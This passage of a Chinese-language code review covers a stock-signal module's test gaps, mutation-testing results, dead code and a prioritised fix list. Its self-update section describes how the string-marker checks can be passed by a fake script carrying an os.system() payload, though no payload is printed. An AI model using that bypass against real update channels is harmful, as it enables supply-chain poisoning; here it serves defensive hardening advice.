12 个随机种子，**只要 1 个**走到「窗口已关闭」就算通过。而 §四的变异测试证明：`C1 关窗` 的 ref 改坏后，**24 个用例仍然全绿**——说明这个 `checked` 命中的样本根本没走到 C1 的判据上。

**证据 2：全部是合成数据，抓不到真实数据的分支**

`make_daily()` 是随机游走（`tests/test_judge.py:27-39`），参数固定为 `μ=0.0004, σ=0.018`。这种序列的形态非常均匀，**永远走不到**：
- 「窗口已死但数据恰好截在月末」（C-1 的唯一触发路径）
- 停牌月（`traded=False`，合成数据里所有月都有交易）
- 一字板（`high == low`，随机游走几乎不可能出现）
- 除权日跳变

**证据 3：13 个变异体存活**（见 §四第 2 层）。这是最硬的证据：**在 13 项「真实会犯的错」面前，24 个用例集体失明**。

### 5.3 具体补测清单（按优先级）

| 优先级 | 测试 | 为什么 |
|:--|:--|:--|
| **P0** | **真实数据 golden 回归**：4 只标的 × 6 锚点 = 24 组，把 `judge()` 的输出存成 golden JSON（含 `final_text`），断言逐字段一致 | 一次补齐所有主路径覆盖。**这也是 §四第 1 层的数据源，一份数据两用** |
| **P0** | `entry.expire_reason == "data_end"` → `final_text` **不得含「有效期已过」** | 直接锁死 C-1 |
| **P0** | `is_stale` 在「数据滞后 > 2 交易日」时为 `True` | 直接锁死 C-2 |
| P1 | 停牌月：构造一个 `n_days=0` 的月，断言 `traded=False` 且不产生事件 | 覆盖 M-8 |
| P1 | 一字板：构造 `high==low` 的突破日，断言计入 `untradeable_days` | D-08 无覆盖 |
| P1 | E-06 不追：构造开盘 > 参考价×1.05 的场景，断言 `status=="missed_5pct"` **且** `final_text` 不说「约 5%」以外的数字 | M-1 |
| P1 | `as_of` 未来日期 / 周末 / 早于上市日 | 已有部分覆盖（`:70, :75`），补周末 |
| P2 | 元测试：`from __future__ import annotations` 存在（见 §1.2） | 一行，锁死唯一兼容护栏 |
| P2 | `dump()` 原子性：写一半失败不破坏旧文件 | H-5 |

### 5.4 一个**已存在的测试盲区**（值得单独说）

`tests/test_judge.py:70-73`：
```python
def test_as_of_before_listing(self):
    r = judge.judge(make_daily(), code="600519", as_of="1990-01-02")
    assert r["indeterminate_reason"] == "insufficient_history"
    assert r["state_a"] is None
```
这条只测了「早于数据起点」。但 `judge.py:630` 的判据是 `a < daily["date"].min()` —— **没有测「as_of 晚于数据末日」**（任务书 task-1 明确要求「as_of 晚于数据末日 → 必须显式说明『数据只到 X』」）。我实测 `judge.py` 现在的行为是：**静默截断到数据末日，不报任何提示**（`judge.py:635` `daily = daily[daily["date"] <= a]` 之后直接往下走，`as_of` 仍照写给 `data_snapshot.as_of`）。这意味着 `data_snapshot.as_of = "2027-01-01"` 而 `trade_date = "2026-10-23"`，两个字段不一致且无提示。

> 这条是**轨道 A 的验收标准之一，没被测试覆盖**。我不重判它该不该算 bug（可能与 task-1 的实现取舍有关），但**作为工程事实标出**：这条路径没有测试。

---

## 六、自更新安全专项

### 6.1 校验强度 —— 名不副实

| 层 | 校验内容 | 实测结论 |
|:--|:--|:--|
| 主脚本 `holdle_data.py` | 3 个身份标记 + `VERSION` 一致性 | ⚠️ 标记是**字符串包含检查**，我用 3 行就构造出「含 3 个标记 + VERSION 匹配 + `os.system()` 载荷」的假脚本，**通过校验** |
| 附属模块 `judge.py` | 2 个字符串：`"HOLDLE 判定模块 judge.py"`、`"def judge("` | ❌ **实测**：注释 + 假 `judge()` 即通过 |
| 全链路 | sha256 / 签名 / pin | ❌ **完全没有**（`grep sha256\|hashlib\|signature` 零命中） |

**这算不算 critical？我的判断：不算，但必须让 Lead 知道这是「有意识的取舍」。**

理由：所有下载源都是 `emilesu/holdle-data-skill` 的 GitHub API / raw / jsDelivr。**攻击者的必要条件是拿到该仓库写权限或 GitHub 账号**。在这个前提下，任何客户端校验都拦不住（因为他也能改校验逻辑本身——校验逻辑和内容同源同权限）。

所以**真正的安全边界是「GitHub 账号安全」，不是客户端校验**。现在的校验只是「防误传/防 CDN 串号」，不是防投毒。

**给 Lead 的决断建议**：
- **短期（本次）**：不阻塞发布。但要把 `holdle_data.py:266` 的注释从「防止投毒下发任意代码」改成如实描述「防止误下发非判定模块」。**现在的注释给了一种虚假的安全感，比没有校验更危险。**
- **中期（建议下个版本）**：发布时把 `judge.py` 的 sha256 写进 `version.json`（一份签名文件，用 GitHub 账号或离线 GPG 签），客户端只认 `version.json` 里的哈希。这不需要基础设施，成本约 2 小时，能防「CDN 串号」和「raw 被劫持」。
- **长期**：别做。为这个场景上完整供应链签名（Sigstore 等）成本与收益不匹配。

### 6.2 部分失败的状态一致性

| 场景 | 现状 | 评价 |
|:--|:--|:--|
| 主脚本更新成功、judge.py 下载失败 | 打印告警 + `import judge` 失败 → 「判定：❌ 本次未生成」 | ✅ 可见失败，不静默 |
| 主脚本更新成功、judge.py **下载到旧版** | **无检测**。两版都含校验字符串 → 通过 → 覆盖成旧版 | ❌ H-3 |
| judge.py 写入时磁盘满 | `_mf.write()` 抛异常 → 进 `_side_fail` → 告警 | ⚠️ 但可能留下**半截文件**（非原子写） |
| 主脚本写入时磁盘满 | `holdle_data.py:230-231` 非原子写 | ⚠️ 更严重：主脚本写坏 → 下次启动直接语法错 → 用户端「整个工具挂了」。有 `.bak` 备份但**没有自动回滚** |

> 主脚本非原子写这条**超出了本次 judge.py 审查范围**（是既有代码），但因为「这次是第一次发多文件」，建议顺手一起改：写 `.tmp` → `os.replace()`。主脚本的 `.bak` 已有，只差「导入失败时自动恢复 .bak」几行。

---

## 七、代码重复 / 死代码 / 命名

### 7.1 函数体量（回答任务书「`_build_entry` 139 行该不该拆」）

| 行数 | 分支/循环 | 位置 | 函数 |
|--:|--:|:--|:--|
| **160** | 23 | 589-748 | `judge` |
| **139** | 15 | 357-495 | `_build_entry` |
| **129** | 17 | 170-298 | `detect_windows` |
| 53 | 3 | 301-353 | `_build_window` |
| 38 | 3 | 539-576 | `_build_state_a` |
| 30 | 3 | 499-528 | `_month_closed` |
| 其余 10 个函数 | ≤3 | | 全部 ≤28 行 |

### 7.2 拆不拆？我的意见：**`_build_entry` 不拆，`judge()` 拆**

**`_build_entry` 139 行不拆**，三个理由：
1. **它是移植代码**。拆了会影响 §四第 3 层的指纹锚定，也让「与知识库逐字对比」变困难。
2. **它是一条线性流水线**：`过滤老事件 → 算日K MACD → 找开窗月首日 → 定窗口上限 → 找绿柱日 → 算参考价 → 扫突破`。每段都依赖上一段的局部变量（`d`/`ym`/`green`/`ref`/`deadline`），强行拆成函数要传 6-7 个参数，可读性反而下降。
3. **它的复杂度是「业务必要」而非「实现糟糕」**：E-01/E-02/E-03/E-06/D-08 五条方法论条款 + 三个 early return，15 个分支是合理的。

**建议只做一件事**：在函数内用注释分段（现在已经有 `# E-02 参考价` 这种），并把 157-162 行的状态字典提取成一个小函数 `_empty_entry()`，减少嵌套层次。

**`judge()` 160 行该拆**，两个理由：
1. 它是**编排层**，天然可以按阶段切：`_validate_input` / `_apply_as_of` / `_check_indeterminate` / `_build_options` / `_compose_statement`。
2. 现在它有 **9 个 `return` 点**（ruff PLR0911），每个 early return 都要手工拼 `out["status"]`/`indeterminate_reason`/`units`，**M-6 那个「不可判时 data_snapshot 为 None」就是这种散落的直接后果**。抽成 `_indeterminate(out, reason, unit)` 一个函数，能自动统一。

### 7.3 死代码 / 死参数（已在 M-2/M-3/M-4 列，这里合并一次）

| 类型 | 位置 | 说明 |
|:--|:--|:--|
| 未使用变量 | `judge.py:245` `last_closed_pos` | ruff F841，「续命标签」残骸 |
| 不可达分支 | `judge.py:228-229, 237` `close_rule="base"` | 默认值，调用处恒传 `"adjacent"` |
| 不可达分支 | `judge.py:280-285` `reason="柱>DEA不开窗"` | `elif hard_gate` 已保证 `hard_gate` 为真 |
| 不可达分支 | `judge.py:110-113` `sticky_mode="d06"` / `"abs"` | 调用处恒传 `"rel"`；`STICKY_BAND` 只在这个死分支里用到 |
| 未使用 import | `tests/test_judge.py:14` | `import importlib.util` |
| 重复常量 | `judge.py:54/190/317/380` | `RECENT_MONTHS` 定义 4 次（1 模块级 + 3 处，其中 2 处是函数内遮蔽） |

> 注意：这些「死分支」是**为了让移植代码与知识库完全一致而保留的**。这是合理取舍（§四第 3 层的指纹需要逐字一致）。**所以不建议删，建议加注释**：`# 以下分支为保持与知识库逐字一致而保留，当前调用处不使用`。现在的问题是它们**看起来像活代码**，会误导维护者（我自己第一遍读就以为 `base` 是主口径，因为它写着"封版口径"）。

### 7.4 命名（nit）

- `_r()` / `_d()` / `_unit()` 这类单字母函数名（`judge.py:116`），在 753 行文件里靠上下文猜含义。建议 `_round_or_none()` / `_make_unit()`。
- `judge()` 的参数 `daily, code, market, stock_name, industry, as_of` —— `stock_name` 和 `industry` 实际只用于金融股判断和输出，都在前半段用，可考虑收成一个 `meta` dict。**不建议改**（会破坏调用方），只作记录。
- `R-BREAKOUT-NO` 这个 code 同时被 `expired`（`judge.py:739`）和 `waiting_breakout`（`judge.py:745`）两个语义不同的分支复用 —— **这是 C-1 根因的一半**。建议 `expired` 用独立的 code（如 `R-BREAKOUT-EXPIRED`），这样「code ↔ 语义」一对一，消费端也能据此分支。

---

## 八、审查方法与可复现证据清单

| 项目 | 做法 | 产出 |
|:--|:--|:--|
| 版本兼容 | `ast.parse(feature_version=(3,7))`、真 3.8.20 `py_compile`、3.12 实跑；`uv` 装 3.8/3.12 + 多版本 numpy/pandas | 4 环境 × 12 组 = 48 次判定，全一致 |
| 差分测试 | `ast` 抽函数体逐字 diff + 真实数据 `judge_service.judge` vs `judge.judge` 逐字段比 | 12 组语义字段全一致，差异=2 处时态措辞 |
| 变异测试 | 20 个变异体注入 `judge.py`（写前备份、跑完 `finally` 还原并校验 md5 一致） | 7 杀死 / 13 存活 |
| 测试执行 | 自写最小 pytest 替身（环境无 pytest） | judge 24/24、holdle_data 13/13 |
| 静态检查 | `ruff 0.17.2`（`--target-version=py37`），规则 F/E/W/UP/SIM/B/C4/RET/ARG/PL/S | judge.py: 53 项（多为 E501/E702/UP031 风格），F841×1，安全性规则 S/B 全过 |
| 性能 | `perf_counter` × 5 次取中位 | 6836 根日线 → 5ms |
| 安全 | 复刻 `_UPDATE_MARKERS` / `_SIDE_MODULES` 校验逻辑，构造假载荷实测 | 两处均通过（结论见 §6） |

**临时脚本位置**（未入库，如需复跑）：
- `/tmp/review/mini_pytest.py` — pytest 替身
- `/tmp/review/differential.py` — 跨实现差分
- `/tmp/review/mutate.py` / `mutate2.py` / `mutate3.py` — 变异测试
- `/tmp/review/golden.json` — 12 组判定基准（建议转为正式 fixture 入库）
- `/tmp/review/*.csv` — 4 只标的真实日线快照

**源码零改动确认**：审查期间 `git diff --stat judge.py` 与 `tests/test_judge.py` 均为空；`holdle_data.py` 的 12 行改动是他人（Lead 的 C6 修复）所作，非本人。

---

## 九、修复优先级排序（给实现者的执行顺序）

```
必修（阻断发布）
 1. C-1  expired 话术分支化         judge.py:738-740       ~12 行  ← 最高优先，用户直接看到
 2. C-2  is_stale 真实实现           judge.py:648           ~15 行
 3. T-1  一致性守护（golden 回归）   新建 tools/…            ~2 小时 ← 这是 §四第 1 层，防复发

强烈建议（同一批修）
 4. H-1  加断言测试锁死 C-1          tests/test_judge.py    ~20 行
 5. H-5  dump 原子写                 judge.py:751-753       3 行
 6. H-2/H-3 judge.py 版本号 + 校验    judge.py + holdle_data.py
 7. M-1  MISS5_PCT 话术格式化        judge.py:737           1 行
 8. M-6  不可判分支补 data_snapshot   judge.py 5 个 early return
 9. T-2  真实数据 golden fixture      tests/                 用 §四的数据

可以下个版本
10. M-2/M-3/M-4  死代码处理（加注释而非删）
11. §1.2 去掉 X|Y 注解对 __future__ 的依赖
12. M-7/M-9/L-*  杂项
13. §7.2  judge() 拆分（受 §四第 3 层指纹保护后再动）
```

---

## 十、给 Lead 的三句话

1. **版本兼容不是这条线的风险**，我用 4 个真实解释器 + 4 代 pandas 实测过了，可以把这个风险从「最高」降下来；真正的风险在**输出层话术与契约字段**。
2. **C-1 是本次唯一「用户一定会看到错话」的问题**，而且触发条件（月末拉数据）是常态。它和昨天修的 C6 是同一个坑，说明**问题不在人，在「防御字段写了没人用」缺少机制**。
3. **「两份实现」的防漏方案，我建议不是抽公共包，而是「差分测试 + 变异测试」双门禁**，接入现成的 `align_check.py`（它已经有 `❌ 阻断` 语义）。成本 3 小时，效果等价，不引入新的分发物。

---

## 附：审查过程中发现的、但不属我职责范围的事实（转交）

| 事实 | 建议转交 |
|:--|:--|
| `judge.py:664` 次新股判据依赖 `monthly["ym"]` 的 `period[M]` 类型，而该列由 `_resample_monthly` 的 `reset_index()` 产出 | 若要重构 `_resample_monthly`，先测次新股分支 |
| `judge_service.py` 与 `judge.py` 在 C-1 上**同错** | 导师审查（task-4）需覆盖此点；knowledge-base 侧也要修 |
| `01_判定输出格式_v0.3.md` §二.1 声称「MCP 侧已按此规则写死在 `app.py::_judge_note`」，但父仓库 `src/holdle_mcp/server/app.py` **搜不到 `_judge_note`**（且 `a5a6dc7` 有 `Revert "feat(judge): 新增 holdle_judge 工具"`） | 文档与代码不一致，文档需更正；MCP 接入状态需确认真实情况 |
| `as_of` 晚于数据末日的路径无测试（见 §5.4） | 轨道 A 验收需覆盖 |
